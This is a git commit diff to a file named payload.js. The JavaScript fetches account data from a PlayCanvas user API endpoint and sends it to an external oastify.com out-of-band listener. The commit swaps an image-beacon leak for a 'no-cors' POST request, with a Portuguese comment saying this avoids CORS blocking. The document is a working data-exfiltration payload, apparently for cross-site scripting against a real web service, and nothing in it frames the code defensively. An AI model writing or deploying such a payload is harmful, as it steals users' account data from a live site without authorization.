b1d1b42cc002d31e376e004680a008e3906f1781
Pedro <52047256+pedrojuniorrd@users.noreply.github.com>
2025-06-04 12:59:59 -0300

    Update payload.js

--- payload.js
+++ payload.js
@@ -1,6 +1,9 @@
 fetch("https://playcanvas.com/api/users/shisco")
-  .then(r => r.text())
+  .then(r => r.text()) // ou .json() se preferir enviar JSON puro
   .then(data => {
-    const img = new Image();
-    img.src = "https://i9s0o50prcnjffe3sa6ci2h70y6pugi5.oastify.com/?" + encodeURIComponent(data);
+    fetch("https://i9s0o50prcnjffe3sa6ci2h70y6pugi5.oastify.com", {
+      method: "POST",
+      mode: "no-cors", // evita bloqueio CORS
+      body: data
+    });
   });
